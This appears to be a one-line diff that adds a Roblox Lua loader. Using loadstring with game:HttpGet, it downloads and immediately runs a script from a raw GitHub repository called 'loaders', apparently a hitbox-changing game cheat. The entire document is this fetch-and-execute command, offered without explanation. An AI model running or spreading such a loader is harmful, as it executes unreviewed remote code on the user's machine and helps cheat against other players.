@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/hitbox-changes-azure-latch-spam6-0mfdmyp4hy6sso.lua"))()
